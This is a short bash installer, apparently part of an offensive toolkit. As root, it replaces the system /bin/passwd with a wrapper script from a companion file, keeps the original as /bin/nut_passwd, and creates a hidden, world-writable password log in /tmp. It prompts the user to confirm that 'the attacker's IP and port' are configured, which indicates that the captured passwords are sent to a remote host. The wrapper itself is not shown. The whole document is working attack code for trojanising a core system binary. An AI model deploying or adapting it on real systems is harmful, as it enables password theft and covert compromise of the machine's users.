#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "You are not root. Please run this script as root."
  exit 1
fi

read -p "Has the attacker's IP and port been modified in './passwd_replace'? (yes/no): " response 

case $response in
    [yY][eE][sS] )
        echo "Proceeding..."
        ;;
    [nN][oO] )
        echo "Exiting..."
        exit 0
        ;;
    * )
        echo "Invalid input. Please enter yes or no."
        exit 1
    ;;
esac

echo "Moving original passwd..."
mv /bin/passwd /bin/nut_passwd

echo "Creating wrapper for nutty passwd..."
cp ./passwd_replace.sh /bin/passwd
chmod 755 /bin/passwd 

echo "Creating log file..."
touch /tmp/.password_log.txt
chmod 666 /tmp/.password_log.txt

echo "Finished!"
exit 0
